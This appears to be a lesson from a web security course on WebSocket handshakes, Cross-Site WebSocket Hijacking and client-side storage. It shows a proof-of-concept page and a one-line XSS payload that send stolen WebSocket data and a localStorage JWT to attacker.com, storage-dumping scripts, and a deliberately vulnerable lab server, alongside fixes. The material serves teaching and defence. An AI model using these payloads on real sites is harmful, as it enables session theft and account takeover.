---
title: "WebSockets and Client-Side Storage"
tags: [foundation, web, WebSocket, localStorage, sessionStorage, IndexedDB,
       client-side-storage, XSS, security, attacker-mindset]
module: 01-Foundation-03
day: 21
related_topics:
  - REST APIs and GraphQL (Day 020)
  - HTTP Cookies Sessions and TLS (Day 005)
  - XSS Fundamentals (Day 090)
  - DOM XSS and Dangerous Sinks (Day 093)
---

# Day 021 — WebSockets and Client-Side Storage

## Goals

By the end of this lesson you will be able to:

1. Explain the WebSocket upgrade handshake and how it differs from HTTP.
2. Intercept and modify WebSocket messages in Burp Suite.
3. Identify WebSocket-specific vulnerabilities: CSWSH, missing auth,
   input injection over the socket.
4. Enumerate all client-side storage mechanisms and what an attacker
   can access via XSS from each.
5. Explain why storing JWTs or session tokens in localStorage is dangerous.

---

## Prerequisites

- [Day 020 — REST APIs, JSON and GraphQL](DAY-0020-REST-APIs-JSON-and-GraphQL.md)
- [Day 005 — HTTP Cookies, Sessions and TLS](../01-Foundation-01/DAY-0005-HTTP-Cookies-Sessions-and-TLS.md)

---

## Main Content — Part 1: WebSockets

### 1. The WebSocket Upgrade

WebSocket starts as an HTTP request, then upgrades to a persistent
full-duplex connection. After the handshake, data flows in frames —
not HTTP requests.

**Handshake:**

```
GET /chat HTTP/1.1
Host: app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://app.example.com

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

After this, the connection is a raw binary channel. No HTTP methods,
no HTTP headers per message. Messages are framed with a WebSocket
frame header.

**Important:** The `Origin` header in the upgrade request is set by the
browser. The **server must validate it** — this is where CSWSH comes in.

---

### 2. Intercepting WebSocket Traffic

Burp Suite intercepts WebSocket handshakes and individual messages
in the **WebSocket history** tab (Proxy → WebSockets history).

```
# In Burp: Proxy → Intercept → WebSockets Interception Rules
# Set: "Intercept client-to-server and server-to-client messages"
# Then modify in real time exactly as you would HTTP requests
```

**From the command line (for automation):**

```bash
# wscat — WebSocket client
npm install -g wscat

# Connect to a WebSocket endpoint
wscat -c "wss://target.com/ws" \
      -H "Authorization: Bearer TOKEN"

# Send a message
> {"action":"getUserData","userId":"1234"}

# Try IDOR via WebSocket:
> {"action":"getUserData","userId":"1235"}
```

---

### 3. WebSocket Vulnerability: CSWSH

**Cross-Site WebSocket Hijacking (CSWSH)** is the WebSocket equivalent
of CSRF. If the WebSocket upgrade uses cookies for authentication but
does not validate the `Origin` header, any site can initiate a
WebSocket connection on the victim's behalf.

**Vulnerable server (doesn't check Origin):**

```javascript
// Node.js / ws library
wss.on('connection', (ws, req) => {
    // Reads session cookie from the request but NEVER checks Origin
    const sessionId = getCookieFromRequest(req);
    authenticateSession(sessionId).then(user => {
        ws.user = user;
    });
});
```

**Attack PoC (attacker.com):**

```html
<script>
const ws = new WebSocket('wss://victim.app.com/ws');
ws.onopen = () => {
    // Browser sends victim's cookies in the upgrade request
    ws.send(JSON.stringify({ action: 'getPrivateMessages' }));
};
ws.onmessage = (e) => {
    // Receive victim's data
    fetch('https://attacker.com/steal?d=' + btoa(e.data));
};
</script>
```

**Fix:** Validate `Origin` header in the WebSocket upgrade handler:

```javascript
wss.on('connection', (ws, req) => {
    const allowedOrigins = ['https://app.example.com'];
    if (!allowedOrigins.includes(req.headers.origin)) {
        ws.close(1008, 'Forbidden origin');
        return;
    }
    // ... authenticate
});
```

---

### 4. Input Injection Over WebSockets

WebSocket messages carry arbitrary data — and that data often flows
into the same backend systems as HTTP parameters:

- A `{"search":"query"}` message might execute a DB query → SQLi.
- A `{"message":"hello"}` might be rendered in another user's browser → XSS.
- A `{"userId":"1234"}` might fetch another user's data without auth → IDOR.

**Testing approach:**
1. Intercept the WebSocket messages in Burp.
2. Identify any parameters that look like they touch a DB or are rendered.
3. Inject standard payloads: `'`, `<script>alert(1)</script>`, `1 OR 1=1`,
   and observe responses.

---

## Main Content — Part 2: Client-Side Storage

### 5. Storage Mechanisms Comparison

| Mechanism | Capacity | Scope | Persistence | JS Accessible | httpOnly |
|---|---|---|---|---|---|
| `Cookie` | 4 KB | Domain + path | Configurable | Yes (unless `httpOnly`) | Yes (if set) |
| `localStorage` | 5–10 MB | Origin | Persistent (no expiry) | Yes, always | No |
| `sessionStorage` | 5–10 MB | Origin + tab | Tab lifetime | Yes, always | No |
| `IndexedDB` | ~50–250 MB | Origin | Persistent | Yes, always | No |
| `Cache API` | Large | Origin | Persistent | Yes, always | No |

**Key security insight:** Cookies can be made inaccessible to JavaScript
via the `httpOnly` flag. `localStorage`, `sessionStorage`, and
`IndexedDB` are always accessible to JavaScript on the same origin.

**Therefore: if an XSS payload can execute on the origin, it can read
everything stored in localStorage and sessionStorage.**

---

### 6. What Gets Stored Where and What It Means

**localStorage — Common attacker targets:**

```javascript
// Read everything in localStorage:
Object.keys(localStorage).forEach(key => {
    console.log(key, localStorage.getItem(key));
});

// What might be there:
// "token" → JWT access token (common in SPAs)
// "refresh_token" → long-lived refresh token → account takeover
// "userProfile" → PII, email, username
// "cart" → can be tampered client-side
// "featureFlags" → may control access to premium features
```

**sessionStorage — Same attack surface, lost on tab close:**

```javascript
Object.keys(sessionStorage).forEach(k =>
    console.log(k, sessionStorage.getItem(k)));
```

**IndexedDB — Richer storage, same accessibility:**

```javascript
const req = indexedDB.open('app-db');
req.onsuccess = (e) => {
    const db = e.target.result;
    const tx = db.transaction(db.objectStoreNames, 'readonly');
    Array.from(db.objectStoreNames).forEach(store => {
        const cursor = tx.objectStore(store).openCursor();
        cursor.onsuccess = (e) => {
            if (e.target.result) {
                console.log(store, e.target.result.value);
                e.target.result.continue();
            }
        };
    });
};
```

---

### 7. Why JWTs in localStorage Are Dangerous

A common architectural choice in SPAs:

```javascript
// Login response:
const response = await fetch('/api/login', {method:'POST', body: loginData});
const { token } = await response.json();
localStorage.setItem('token', token);

// Every subsequent request:
fetch('/api/user', {
    headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
});
```

**The problem:** Any XSS payload on the same origin can do:

```javascript
fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'));
```

The attacker now has a valid JWT — they can authenticate as the victim
from any device, not just from the victim's browser session.

**Compare to cookies with `httpOnly`:**
- An `httpOnly` cookie cannot be read by JavaScript.
- XSS can still forge requests (CSRF-like) but cannot exfiltrate the token
  for offline use.

**Best practice:** Use `httpOnly`, `Secure`, `SameSite=Strict` cookies for
session tokens. Accept the CSRF trade-off and mitigate it with CSRF tokens.
Do not store authentication tokens in localStorage.

---

## Key Takeaways

1. **CSWSH = CSRF for WebSockets.** If the server authenticates via cookies
   and doesn't validate `Origin` in the upgrade, any site can hijack the
   WebSocket. Validate the `Origin` header server-side.
2. **WebSocket messages go through the same backend as HTTP.** SQLi, XSS,
   IDOR — all apply. Test WebSocket parameters the same way you test URL
   params.
3. **localStorage is always readable by JavaScript on the same origin.**
   If the app has even one XSS, every JWT and credential in localStorage
   is compromised. `httpOnly` cookies are the safer session mechanism.
4. **Check DevTools → Application → Storage before testing a web app.**
   See what's already stored: tokens, user data, feature flags — it
   reveals the architecture and the attack surface before you send a
   single request.

---

## Exercises

### Exercise 1 — Intercept WebSocket Messages

1. Open `wss://javascript.info/article/websocket/demo/hello` (public demo)
   or set up a local WebSocket server.
2. Configure Burp to intercept WebSocket traffic.
3. Modify a message in transit and observe the response.

### Exercise 2 — CSWSH Lab

```javascript
// Vulnerable WebSocket server (Node.js)
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer();
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
    // BUG: never checks req.headers.origin
    ws.on('message', (msg) => {
        const data = JSON.parse(msg);
        if (data.action === 'getSecret') {
            ws.send(JSON.stringify({ secret: 'super_private_data_for_user' }));
        }
    });
});
server.listen(8080);
```

Build the attacker HTML page that connects from `http://evil.com:9090`
and steals the secret. Use `wscat` or a browser to confirm.

### Exercise 3 — localStorage Token Theft

1. Set up a simple SPA that stores a JWT in localStorage after login.
2. Write a simulated XSS payload (in DevTools console, same origin) that
   extracts the JWT and prints it.
3. Refactor the app to use `httpOnly` cookies instead.
4. Confirm the same console script can no longer read the token.

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 020 — REST APIs, JSON and GraphQL](DAY-0020-REST-APIs-JSON-and-GraphQL.md)*
*Next: [Day 022 — Burp Suite Setup, Proxy and Repeater](DAY-0022-Burp-Suite-Setup-Proxy-Repeater.md)*
